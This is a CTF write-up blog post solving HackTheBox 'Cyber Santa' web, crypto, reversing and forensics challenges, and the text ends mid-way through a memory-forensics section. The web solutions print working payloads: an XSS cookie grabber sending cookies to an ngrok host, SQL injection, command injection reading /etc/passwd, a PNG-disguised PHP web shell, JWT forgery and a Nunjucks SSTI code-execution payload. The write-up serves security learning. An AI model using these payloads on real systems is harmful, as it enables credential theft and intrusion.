# HTB CTF: Cyber santa is coming to town
---
- [About the CTF](#about-the-ctf)
- [WEB Challenges](#web-challenges)
  - [Toy Workshop](#toy-workshop)
  - [Toy Management](#toy-management)
  - [Gadget Santa](#gadget-santa)
  - [Elf Directory](#elf-directory)
  - [Naughty or Nice](#naughty-or-nice)
- [CRYPTO Challenges](#crypto-challenges)
  - [Common Mistake](#common-mistake)
  - [XMAS Spirit](#xmas-spirit)
  - [Missing Reindeer](#missing-reindeer)
- [Reversing](#reversing)
  - [Infiltration](#infiltration)
- [Forensics](#forensics)
  - [baby APT](#baby-apt)
  - [Honeypot](#honeypot)
  - [Giveaway](#giveaway)
  - [Ho Ho Ho](#ho-ho-ho)

# About the CTF

[Cyber Santa CTF](https://ctftime.org/event/1523/) is a Jeopardy style CTF hosted by [HackTheBox](https://www.hackthebox.com/events/santa-needs-your-help). This CTF was for 5 days, each day 5 new challenges were introduced. 

Categories of challenges: Web, Crypto, PWN, Reversing and Forensics

> This post will contain everything I tried for this CTF. I was able to complete only 9 out of the 25 challenges.




# WEB Challenges

## Toy Workshop


Reading through the given source code... the interesting/useful things are:

- Routes:
  - GET /
  - GET /queries
  - POST /api/submit

- Parameters required in the POST request: `query`


    ```js
    const { query } = req.body;
    if(query){
        return db.addQuery(query)
            .then(() => {
                bot.readQueries(db);
                res.send(response('Your message is delivered successfully!'));
            });
    }
    ```

So lets send a POST request to the site: `/api/submit`:

```http
POST /api/submit HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: hblid=m0DSqog5HrcMYdLs3m39N0P0H10AGoB2; olfsk=olfsk5961333701927383
Upgrade-Insecure-Requests: 1
If-None-Match: W/"35-jrW/GzpnDcXpkDan+rs+Epa0W9E"
Content-Type: application/json
Content-Length: 21


{
"query": "test"
}
```

response:

```json
{"message":"Your message is delivered successfully!"}
```

But when we navigate to `/queries` the GET request, HTTP code 301 : redirection to `/` is returned. The reason behind this is :

```js
router.get('/queries', async (req, res, next) => {
	if(req.ip != '127.0.0.1') return res.redirect('/');

	return db.getQueries()
		.then(queries => {
			res.render('queries', { queries });
		})
		.catch(() => res.status(500).send(response('Something went wrong!')));
});
```

Looking up what `req.ip` stores: [req.ip in Express JS](https://expressjs.com/en/5x/api.html#req.ip). This value can be set by using the `X-Forwarded-For` header... this turned out to be a rabbit hole.

Went back to give the source code a look and found that the Flag is being stored as a cookie! 

Snippet from _bot.js_

```js
const cookies = [{
	'name': 'flag',
	'value': 'HTB{f4k3_fl4g_f0r_t3st1ng}'
}];


const readQueries = async (db) => {
		const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();
		await page.goto('http://127.0.0.1:1337/');
		await page.setCookie(...cookies);
		await page.goto('http://127.0.0.1:1337/queries', {
			waitUntil: 'networkidle2'
		});
		await browser.close();
		await db.migrate();
};
```

The first thought that came to me was **XSS**. So tried some basic cookie grabbing payloads from [PayloadsAllThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) and sent in as the `query` value.

This needs **ngrok** as we don't have a public server. so we can create a NGROK server

```bash
updog -d . -p 80
ngrok tcp 80
```

Payload used:
```json
{
"query": "<script>document.location='http://4.tcp.ngrok.io:11983/XSS/grabber.php?c='+document.cookie</script>"
}
```

And after sending the POST request we get a hit!!

<figure>
<img src="/assets/img/htbctf/toyworkshop.png" alt="XSS success">
</figure>

**FLAG: HTB{3v1l_3lv3s_4r3_r1s1ng_up!}**

---

## Toy Management

The source code for the web app was provided for this challenge too and just a quick look on how the **Login** process happens shows that the attack vector is **SQL Injection**

```js
let stmt = `SELECT username FROM users WHERE username = '${user}' and password = '${pass}'`;
```

The inputs we provide are unsanitized and get directly inserted into the SQL command. So we should be able to use SQLi payloads to bypass authentication.

_database.sql_ file shows where the flag is in `toylist` table

To bypass authentication and log in as admin the most basic SQLi payload works:

```sql
admin'-- -
```

If we wish to dump all the data in the table we can use sqlmap:

```bash
sqlmap -r login.req --level=3 --risk=3 --batch --thread=10 --dump

# <SNIP>
+----+-----------------------------------+----------+-------------+----------------+
| id | toy                               | approved | location    | receiver       |
+----+-----------------------------------+----------+-------------+----------------+
| 1  | She-Ra, Princess of Power         | 1        | Houston     | Elaina Love    |
| 2  | Bayblade Burst Evolution          | 1        | Dallas      | Jarrett Pace   |
| 3  | Barbie Dreamhouse Playset         | 1        | Austin      | Kristin Vang   |
| 4  | StarWars Action Figures           | 1        | Amarillo    | Jaslyn Huerta  |
| 5  | Hot Wheels: Volkswagen Beach Bomb | 1        | San Antonio | Eric Cameron   |
| 6  | Polly Pocket dolls                | 1        | El Paso     | Aracely Monroe |
| 7  | HTB{1nj3cti0n_1s_in3v1t4bl3}      | 0        | HTBland     | HTBer          |
+----+-----------------------------------+----------+-------------+----------------+

# <SNIP>
```

**FLAG: HTB{1nj3cti0n_1s_in3v1t4bl3}**

---

## Gadget Santa

Source code is downloadable and reading through it shows that there exist 2 servers:
  1. Port 80 : PHP server
  2. Port 3000 : Python server

Examining `config/ups_manager.py` : the flag is returned when a GET request is made to `/get_flag`.

```python
elif self.path == '/get_flag':
    resp_ok()
    self.wfile.write(get_json({'status': 'HTB{f4k3_fl4g_f0r_t3st1ng}'}))
    return
```

And the public site running on port 80 has an interesting parameter : `command`. Reading through the source code shows that the user input passed to `command` gets sanitized.

Snippet from : `challenge/models/MonitorModel.php`

```php
class MonitorModel
{   
    public function __construct($command)
    {
        $this->command = $this->sanitize($command);
    }

    public function sanitize($command)
    {   
        $command = preg_replace('/\s+/', '', $command);
        return $command;
    }

    public function getOutput()
    {
        return shell_exec('/santa_mon.sh '.$this->command);
    }
}
```

Filter used here removes all whitespaces. So tried a bunch of filter bypass techinques and got two successful hits:

1. `cat</etc/passwd` : using `<` 
2. `echo${IFS}"RCE"${IFS}%26%26cat${IFS}/etc/passwd` : using IFS(Internal Field Separator)

Using the second techinque to read the flag, payload used:

```bash
echo${IFS}"RCE"${IFS}%26%26curl${IFS}"http%3a//localhost%3a3000/get_flag"
```

and we have the flag: 

<figure>
<img src="/assets/img/htbctf/gadgetsantaflag.png" alt="Gadget Santa Flag">
</figure>


**FLAG: HTB{54nt4_i5_th3_r34l_r3d_t34m3r}**

---

## Elf Directory

> No source code was provided for this challenge

Created a new user on the site -> found that a `PHPSESSID` cookie is set once we log in. 
This cookie is _base64 encoded_. So decoding it from Base64 reveals:

```bash
echo 'eyJ1c2VybmFtZSI6ImZhc3RieXRlIiwiYXBwcm92ZWQiOmZhbHNlfQ==' | base64 -d
{"username":"fastbyte","approved":false}
```

The `approved` field looks interesting. Changing the value for our user to `true` -> encoding it using Base64 and modifying the cookie value in browser. Doing this opens up the option to upload a PNG image as the profile pic for our user. This function was not available previously.

Tried uploading a generic PHP payload:

```php
<?php system($_GET['cmd']); ?>
```

The site doesn't allow anything other than a PNG file... using different extensions, modifying content-type in request all failed.
So moved on to try inserting the **magic bytes** of PNG file at the start of our malicious upload. This will help bypass Magic bytes filter if used in the web app.

**Creating a shell.php with PNG magic bytes**

```bash
# Magic bytes in Hex format
echo -n -e '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52' > shell.php

# Appending the PHP payload
echo -e "\n<?php system(\$_GET['cmd']); ?>" >> shell.php
```

And this worked!!

Now we can navigate to the file in my case it was stored at `/uploads/9a248_shell.php`. This can be found by simply right clicking on the profile picture and using "copy link"

We have RCE!! 

<figure>
<img src="/assets/img/htbctf/elfdirrce.png" alt="Elf Directory RCE">
</figure>

<figure>
<img src="/assets/img/htbctf/elfdirrequest.png" alt="Elf Directory Flag">
</figure>

**FLAG: HTB{br4k3_au7hs_g3t_5h3lls}**

REF:
1. [Hacktricks - File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload#bypass-content-type-and-magic-number)
2. [Wiki - File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures)


---

## Naughty or Nice

> I was not able to solve this challenge.
> 
> Source code was provided for this challenge

I didn't realise the source code was downloadable at first and directly got into examining the website. Found that we can register a user. Once registered and logged in, noticed that we have a JWT(Java Web Token) stored in our `session` cookie

Throwing that JWT on [jwt.io](https://jwt.io/)

<figure>
<img src="/assets/img/htbctf/nonjwt.png" alt="JWT token on jwt.io">
</figure>

Found the `public key` to be encoded withing the JWT, this was really interesting. After a short trip to Google found out that this was exploitable. 

**Attack on JWT:** using this [REF](https://www.craftypenguins.net/capture-the-flag-ctf-challenge-part-4/) to understand the attack. 

We know the target username is `admin` from the source code: 

<figure>
<img src="/assets/img/htbctf/nonadmin.png" alt="username admin">
</figure>

Forging a JWT with [jwt_tool](https://github.com/ticarpi/jwt_tool):

```bash
python3 jwt_tool.py "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImZhc3RieXRlIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE2SjQvZURHSnNSVHY1UVJnMWp5ZlxuMEpLYjZhMWlCbStQSWM3ZlNQcGFoRUZSNkVZazk1YjlrMkpqOFRTRVlGbE9lWWFuNWxFREp1bXhZcGZxaW5TUlxuY3JHZUFJS011VnRpdngva2FMZU56YUlPN2l1RTJpdmtPQzdhclFBekw2YlkwUmpQQWZHQytVZ3V1UE5CVzRFRFxueHVyd3dsME5zUkhkUXpxWThRTnFkSTdYRURqRkIwVDZwcEtCNDNDUGlEd0IybVBML0xOS1MrbHdRRTlBK0RnK1xuMERlQy9EMytIc1RWcHhldXE0blFMMzdrQXZxRTczSXU3M0hqZFFOKzBGVC9TNzQyaWpDV1VLMHM2RXJjOWxQK1xuaGs5eWtwbzdZWjlCaXRpSjByYUJZM3BSTlhpV0ZYVW9FUG81R0FXVnpXRjFpRWtCMjEvdU1vdnlJRDlmdmRObFxuWlFJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLSIsImlhdCI6MTYzODcxMDk2OX0.x4QLkF-Ccwf9NJIN8Vnvq8C4d3IuoAKcGA3eSFXq2Id9NdLWnvqqOaWvPkj3LTQqVFAuNCZNMjbDEf7i24-fo7yKttsmTVXL3XJXwClvEVYz4hxxChyTyQLTScEGE1WvcwXp3nfLcz-4GbbHeZK37VEXa5kTm9s1IFrsYX7byluspNfhEZtxSyYjdyOCo_H6D-ElW01RnmxQfrCDMojbDQ9ZrHYFNIbD8qHjKrWzL0pM7XCjee-qrKI1TwDXegj-XBzBftarjGL5scpQIj-mPtYKU0TkEBgG79zz8YovTT6rlGoMOg_BZwmxQhdGzMULLP2sXG92-ap5AfXm53xxiw" -I -pc username -pv "admin" -S hs256 -k ~/htb/challenges/web_naught_or_nice/public.pem   

jwttool_ba8b7ef657c433794746cf4f0a4cb4d4 - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE2SjQvZURHSnNSVHY1UVJnMWp5ZlxuMEpLYjZhMWlCbStQSWM3ZlNQcGFoRUZSNkVZazk1YjlrMkpqOFRTRVlGbE9lWWFuNWxFREp1bXhZcGZxaW5TUlxuY3JHZUFJS011VnRpdngva2FMZU56YUlPN2l1RTJpdmtPQzdhclFBekw2YlkwUmpQQWZHQytVZ3V1UE5CVzRFRFxueHVyd3dsME5zUkhkUXpxWThRTnFkSTdYRURqRkIwVDZwcEtCNDNDUGlEd0IybVBML0xOS1MrbHdRRTlBK0RnK1xuMERlQy9EMytIc1RWcHhldXE0blFMMzdrQXZxRTczSXU3M0hqZFFOKzBGVC9TNzQyaWpDV1VLMHM2RXJjOWxQK1xuaGs5eWtwbzdZWjlCaXRpSjByYUJZM3BSTlhpV0ZYVW9FUG81R0FXVnpXRjFpRWtCMjEvdU1vdnlJRDlmdmRObFxuWlFJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLSIsImlhdCI6MTYzODcxMDk2OX0.2XELpSZGCnOicu_kXLfqXhvbIfSTRg1BN8Pm3iaeYGA
```

Updating the `session` cookie value in browser and now we have access to directories like: `/dashboard` and we can even edit the names of the Elves by making a POST request to `/api/elf/edit` with the data like: 

```json
{"elf_name":"nobody","type":"naughty","editelf_id":"1"}
```

> Got stuck exactly at this point!

Initially thought SSQL injection was the attack path but was wrong. Knew **Nunjucks** is vulnerable to SSTI(Server Side Template Injection).

**Nunjucks vulnerable to SSTI:**

From official docs:

> Nunjucks does not sandbox execution so it is not safe to run user-defined templates or inject user-defined content into template definitions. On the server, you can expose attack vectors for accessing sensitive data and remote code execution. On the client, you can expose cross-site scripting vulnerabilities even for precompiled templates (which can be mitigated with a strong CSP). See this issue for more information.


When I tested the payload: `\{\{'7'*7\}\}`(remove the `\`) on the `elf_name` field, couldn't find the result _49_ being reflected on the site. This was cause the templating happens on `/` whereas I was looking for the vuln in `/dashboard`.


<figure>
<img src="/assets/img/htbctf/nonssti.png" alt="username admin">
</figure>

Now that SSTI is confirmed need to look for a SSTI command that can be used for RCE. The commands from PayloadAllThings-SSTI failed.
Found this site: [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine), the payload mentioned here worked and gave us RCE!!

> **Remove the '\' at the start. Jekyll doesn't like curly braces**

```
{\{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag.txt')")()}}
```

<figure>
<img src="/assets/img/htbctf/nonflag.png" alt="FLAG for naughty or nice">
</figure>

**FLAG: HTB{S4nt4_g0t_ninety9_pr0bl3ms_but_chr1stm4s_4in7_0n3}**

---

# CRYPTO Challenges

## Common Mistake

Given file: `encrypted.txt`

```
{'n': '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef', 'e': '0x10001', 'ct': '0x55cfe232610aa54dffcfb346117f0a38c77a33a2c67addf7a0368c93ec5c3e1baec9d3fe35a123960edc2cbdc238f332507b044d5dee1110f49311efc55a2efd3cf041bfb27130c2266e8dc61e5b99f275665823f584bc6139be4c153cdcf153bf4247fb3f57283a53e8733f982d790a74e99a5b10429012bc865296f0d4f408f65ee02cf41879543460ffc79e84615cc2515ce9ba20fe5992b427e0bbec6681911a9e6c6bbc3ca36c9eb8923ef333fb7e02e82c7bfb65b80710d78372a55432a1442d75cad5b562209bed4f85245f0157a09ce10718bbcef2b294dffb3f00a5a804ed7ba4fb680eea86e366e4f0b0a6d804e61a3b9d57afb92ecb147a769874'}
{'n': '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef', 'e': '0x23', 'ct': '0x79834ce329453d3c4af06789e9dd654e43c16a85d8ba0dfa443aefe1ab4912a12a43b44f58f0b617662a459915e0c92a2429868a6b1d7aaaba500254c7eceba0a2df7144863f1889fab44122c9f355b74e3f357d17f0e693f261c0b9cefd07ca3d1b36563a8a8c985e211f9954ce07d4f75db40ce96feb6c91211a9ff9c0a21cad6c5090acf48bfd88042ad3c243850ad3afd6c33dd343c793c0fa2f98b4eabea399409c1966013a884368fc92310ebcb3be81d3702b936e7e883eeb94c2ebb0f9e5e6d3978c1f1f9c5a10e23a9d3252daac87f9bb748c961d3d361cc7dacb9da38ab8f2a1595d7a2eba5dce5abee659ad91a15b553d6e32d8118d1123859208'}
```

Given encryption is **RSA**, looking at the values for the two encryptions, the `n` value is identical. This results in **Common Modulus attack**

Ref : [https://www.voidsecurity.in/2013/05/volga-ctf-quals-2013-crypto-200-team.html](https://www.voidsecurity.in/2013/05/volga-ctf-quals-2013-crypto-200-team.html)

Used **Sage Math** to solve this challenge

```python
sage: e1 = 65537
sage: e2 = 35
sage: n = 21388731509885000178627064516258054470260331371598943108291856742436111736828979864010924669228672392691259110152052179841234423220373839350729519
....: 449867096270377366080249815393746878871366061153796079471618562067885157333408378773203102328726963273544788844541658368239189745882391132838451159906
....: 995037703318134437625750463265571575001855682002307507556141914223053440116920635522540306152978955166077383503077296996797116492665606386925464305499
....: 727852298454712455680910133707466125522128546462287576144499756117801116464261543533542827392699481765864054797509983998681705356909524163419157085924
....: 159390221747612487407
sage: c1 = 1083276713666161962229320874844496239235521130139043412093985818306134812112648491426367126203260387508466784482301566444737564871832749448965681
....: 786002573772735682270389229321102232069969791962790739458378734503871433373960069838253285461863609493025303348947135145142960735315101556812326842736
....: 795034832913556972279292924139432516745352516081874648125780311238489062189715130791414720738594564405497878584651456137948792312522173097799864140460
....: 815362122198924286207203804889109333703991390583026976841492733474397850849483158621446412384782897194122103787526051647398202511697614275348169181141
....: 7555124564400023181428
sage: c2 = 1533958151228054625302238761333050613547352894621738621410439288617453296213513901817902898041560250179973166562353333716146634314177469526079834
....: 296690759296919213673042883810166811759962707442445636936273233102553465231062621791137216874178441023337018881901554169445731335972756455313524386509
....: 181354357416950340999776518676797631666835199824368548418361563305241357239587065889918913571413715248669032092088496391538887342150902781288850006374
....: 454550364023383375960098048953396822083977837213076611529096139375894814165530667777638142981957862657587551159661670668864942219343212957921608548106
....: 3417748767088461582856
sage: gcd(e1, e2)
1
sage: val = xgcd(e1, e2)
sage: val
(1, -2, 3745)
sage: a = -val[1]
sage: b = val[2]
sage: a
2
sage: b
3745
sage: cipher1_inv = inverse_mod(c1, n)
sage: cipher1_inv
3238778780397809527330860006525882963707438115430747824286922567124642598521546669127113177200012163227171401794843905733909198222532802003421825494212195675455800786039316961807799749539372403622334317965431751549653184790247167121496797872170504510007247544679126469301174470844816806854301805377606418809653538595226565541789117221040518564910403954742829745885123031507287900701604258156981970936654908107704610013767678626926422634122315876400847920553924675254532035967304970598645279283351106848382506325911185211341989241761613027912645117216140106431973754194746028443041923678007445244046447579686917047
sage: c1a = Mod(cipher1_inv, n) ^ a
sage: c1a
16404641902202369023721940743549014481365678295420497598972006174773264152450669573992661731531834478087923566198714363910440551300776218114101749536997856980690978791609641783694518867501815619411470863324084559376858188769215253350267780306997931772180395322804794000357005695473573714560206145400630831568921080762190820433682718989869113698937669631344705225152484745189277659701918412999775986672922179791333395091152716564003217029361436751009198008705425927866380750361808493391756575815645091206628689442537586046697034989211632310282571908756995358221499688818294828500887133860408035561502225299038203415242
sage: c2b = Mod(c2, n) ^ b
sage: c2b
17522952664437856871508051365542459035871889568777569103288755535508960218636445268696207944175317383177608944871897094193841467523746751235838707937456216553944699531085811824203903013014183981584412486193797059089468167664166396622646061175549567593122038647394936801448803945428744306740746238759904787713109842656059234344952817677793146152188575266382407750422557611314088858013491868956788359093760614386247798059079528109637808958624353512725213574752955582654716879648620680687737120298727680311168426298343737526065018605079661986249945412939011031064469046006435788693174840922539323026736327229958911535501
sage: (c1a * c2b) % n
154494104151501230741951698942733388017524925426108770319061863579333462036794337421344018523054973
```

`154494104151501230741951698942733388017524925426108770319061863579333462036794337421344018523054973` : Convert to HEX then decoded it using cyberchef

<figure>
<img src="/assets/img/htbctf/commonmistake.png" alt="Common Mistake Flag">
</figure>

**FLAG: HTB{c0mm0n_m0d_4774ck_15_4n07h3r_cl4ss1c}**

---

## XMAS Spirit

We are given 2 files for this challenge:
1. ***challenge.py*** - source code for encryption
2. ***encrypted.bin*** - file that needs to be decrypted

**challenge.py**:

```python
#!/usr/bin/python3

import random
from math import gcd

def encrypt(dt):
	mod = 256
	while True:
		a = random.randint(1,mod)
		if gcd(a, mod) == 1: break
	b = random.randint(1,mod)

	res = b''
	for byte in dt:
		enc = (a*byte + b) % mod
		res += bytes([enc])
	return res

dt = open('letter.pdf', 'rb').read()

res = encrypt(dt)

f = open('encrypted.bin', 'wb')
f.write(res)
f.close()
```

From the source code it is clear that we need to reverse exactly this one line : `enc = (a*byte + b) % mod`
We need to find the inverse to reverse the multiplication under the modulus. We also know that the number `a` is chosen if and only if `gcd(a, 256) == 1`. Googling exactly this, leads to : **Multiplicative Modular Inverse**

> **Multiplicative modular inverse:**
>
> **if gcd(a,b) == 1 then there exists an INVERSE**
>
> **the inverse is given as: inv = a^-1 % b**

**Decrypting: process:**

From the `challenge.py` file we can see that the `encrypted.bin` is a PDF file. So we can brute force the keys `a` and `b` by encrypting the Magic bytes of PDF and if it matches with the starting bytes(magic bytes) after encryption then we have got the right keys

```
Magic bytes of PDF: 25 50 44 46 2D
```

The encrypted magic bytes of `encrypted.bin` : 

<figure>
<img src="/assets/img/htbctf/xmasmagic.png" alt="encrypted magic bytes">
</figure>

Py script to brute force the values of `a` and `b`:

```python
>>> f = open('blank.pdf', 'rb').readline()
>>> f
b'%PDF-1.6\r%\xe2\xe3\xcf\xd3\r\n'
>>> def Brute():
...     for a in [i for i in range(1, 257) if gcd(i, 256)==1]:
...         for b in range(1, 257):
...             encrypt(a,b)
...
...

>>> def encrypt(a,b):
...     print(f"{a=} ; {b=}")
...     for byte in f:
...         enc = (a*byte + b)%256
...         print(format(enc, 'x'), end=" ")
...     print("\n----------")
...
```

After some time found the values to be: 

```
a=169 ; b=160
```

Now that we have the actual values, we can find the _inverse of a_ and begin decrypting the `encrypted.bin`
Final python script:

```python
#!/usr/bin/python3
from math import gcd

a=169
b=160

# Finding the inverse
inv = pow(a, -1, 256)

def decrypt(ct):
    res = b''
    for byte in ct:
        dec = byte - b
        dec = inv * dec % 256
        res += bytes([dec])
    return res

ct = open('encrypted.bin', 'rb').read()
pt = decrypt(ct)
f = open('letter.pdf', 'wb')
f.write(pt)
f.close()
print("[XX] !! DONE !! [XX]")
```

And we finally have `letter.pdf`. Opening it reveals the flag!!

<figure>
<img src="/assets/img/htbctf/xmaspdf.png" alt="Decrypted PDF">
</figure>

**FLAG:  HTB{4ff1n3_c1ph3r_15_51mpl3_m47h5}**

---

## Missing Reindeer

For this challenge we are given a single file: `message.eml`. Inside which there was one _public key_ and the _encrypted text_

**Public key:**
```
-----BEGIN PUBLIC KEY-----
MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEA5iOXKISx9NcivdXuW+uE
y4R2DC7Q/6/ZPNYDD7INeTCQO9FzHcdMlUojB1MD39cbiFzWbphb91ntF6mF9+fY
N8hXvTGhR9dNomFJKFj6X8+4kjCHjvT//P+S/CkpiTJkVK+1G7erJT/v1bNXv4Om
OfFTIEr8Vijz4CAixpSdwjyxnS/WObbVmHrDMqAd0jtDemd3u5Z/gOUi6UHl+XIW
Cu1Vbbc5ORmAZCKuGn3JsZmW/beykUFHLWgD3/QqcT21esB4/KSNGmhhQj3joS7Z
z6+4MeXWm5LXGWPQIyKMJhLqM0plLEYSH1BdG1pVEiTGn8gjnP4Qk95oCV9xUxWW
ZwIBAw==
-----END PUBLIC KEY-----
```

**Encrypted text:**
```
Ci95oTkIL85VWrJLVhns1O2vyBeCd0weKp9o3dSY7hQl7CyiIB/D3HaXQ619k0+4FxkVEksPL6j3wLp8HMJAPxeA321RZexR9qwswQv2S6xQ3QFJi6sgvxkN0YnXtLKRYHQ3te1Nzo53gDnbvuR6zWV8fdlOcBoHtKXlVlsqODku2GvkTQ/06x8zOAWgQCKj78V2mkPiSSXf2/qfDp+FEalbOJlILsZMe3NdgjvohpJHN3O5hLfBPdod2v6iSeNxl7eVcpNtwjkhjzUx35SScJDzKuvAv+6DupMrVSLUfcWyvYUyd/l4v01w+8wvPH9l
```

From the given public key the values of `n` and `e` can be extracted using the python script below or using **RSACtfTool**:

```python
from Crypto.PublicKey import RSA

f = open('public.pem','r')
key = RSA.importKey(f.read())
print(key.n)
print(key.e)
```

```
n = 29052360453120059177701146498207729611014362120841772147885284668310294675407700581246333337318872050600353022438909391852076208405990507154764842795064455368228014381969783955360165426546947312973195061115837228105648770122442650123819968683831588775039837617788817831554836487051931001049480790287468125246758818911220414888048673899462271009956700067150701189256017793349102117503912782889345559816174845605183913828898737756645848010661322897081850561427949550036638510279173557403134806365178654334553002357480355906235714208451535185647256346503450896572487047615057007598805977277186223884121839444217172432487

e = 3
```

Values of `a` and `b` can also be found from value of `n` using **FactorDB**:

```
290523604531200591777011464982077296110143621208417721478852846683102946754077005812463333373188720506003530224389093918520762084059905071547648427950644553682280143819697839553601654265469473129731950611158372281056487701224426501238199686838315887750398376177888178315548364870519310010494807902874681252467588189112204148880486738994622710099567000671507011892560177933491021175039127828893455598161748456051839138288987377566458480106613228970818505614279495500366385102791735574031348063651786543345530023574803559062357142084515351856472563465034508965724870476150570075988059772771862238841218

39444217172432487
```

This is a text book example of **RSA - Weak Exponent Attack**. More info about this attack: [RSA weak exponent attack](https://cims.nyu.edu/~regev/teaching/lattices_fall_2004/ln/rsa.pdf).

Solve:

```python
>>> import libnum
>>> c = libnum.s2n(open("enc","rb").read())
>>> c
3778608670452741690585532070582737668282151949640402971008788675797867361769689843795603772570139166588578774047027062261466175271392436524653959718229204843915061726484932376601163405265201763831847338823471193932707736077364458453053284027613438860180982451957373644892420683829816445662870127785631688212264667656902285465215893696422157358833968897797828703078065238512429996646780856030831270941538206089269140998459840179372535825110571621961016595399813535271853291603009139930478398009395635275428350832860405110482112603276542371203486280518726687143561313790881202021
>>> import gmpy2
>>> gmpy2.iroot(c,3)
(mpz(1557557083543814172336607163260092833421057646019104960727073356364066073441281899179702244042726263049650591998409092023301232930288444853604698625348475061214874927442198998278165154227631741), True)
>>> m = libnum.n2s(1557557083543814172336607163260092833421057646019104960727073356364066073441281899179702244042726263049650591998409092023301232930288444853604698625348475061214874927442198998278165154227631741)
>>> m
b'We are in Antarctica, near the independence mountains.\nHTB{w34k_3xp0n3n7_ffc896}'
>>>
```

**FLAG: HTB{w34k_3xp0n3n7_ffc896}**

---

# Reversing


## Infiltration

> I was not able to solve this challenge... Don't know how I missed this 😥

Only a `client` file was downloadable and there was a docker instance we needed to spin up. Using the given `client` script to connect to the docker server:

```bash
./rev_infiltration/client 178.62.5.61 31485
[!] Untrusted Client Location - Enabling Opaque Mode
```

Googling what "Opaque Mode" meant was a huge rabbit hole... Wasted a lot of time on this particular wild goose hunt.

**Solve:** Running `strace` while executing shows that `puts` is being called and it prints the flag.

<figure>
<img src="/assets/img/htbctf/infiltration.png" alt="REV:Infiltration - flag">
</figure>

**FLAG: HTB{n0t_qu1t3_s0_0p4qu3}**


---

# Forensics

## baby APT

This was a really simple challenge. A PCAP file: `christmaswishlist.pcap` was provided. Using _Protocol hierarchy_ we see that some of the captured packets include **Line based text data**, which is really interesting:

<figure>
<img src="/assets/img/htbctf/babyproto.png" alt="Protocol hierarchy">
</figure>

Filtering only the line text data using the filter: `data-text-lines` we get 8 packets:

<figure>
<img src="/assets/img/htbctf/baby8packets.png" alt="Line data packets">
</figure>

Looking at the packets they seem like the page source code for some site. The last packet is really interesting cos it has some _base64_ text:

```
SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW5
```

Decoding that we get the flag!

**FLAG: HTB{0k_n0w_3v3ry0n3_h4s_t0_dr0p_0ff_th3ir_l3tt3rs_4t_th3_p0st_0ff1c3_4g41n}**

---

## Honeypot

> Got pretty close to solving it but couldn't get the URL right

**Challenge description:** 

Santa really encourages people to be at his good list but sometimes he is a bit naughty himself. He is using a Windows 7 honeypot to capture any suspicious action. Since he is not a forensics expert, can you help him identify any indications of compromise?

Find the full URL used to download the malware.
Find the malicious's process ID.
Find the attackers IP
Flag Format: HTB{echo -n "http://url.com/path.foo_PID_127.0.0.1" | md5sum}

For this challenge we were given a `honeypot.raw` file

**Finding the right tool:** Based on previous reading(of writeups) **Volatility** is the tool generally used for memory forensics. But a quick google for "forensics tools" will lead you to it.

**Enumerating the .raw file**:

```bash
vol.py -f honeypot.raw imageinfo
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/kali/htb/challenges/for_honeypot/honeypot.raw)
                      PAE type : PAE
                           DTB : 0x185000L
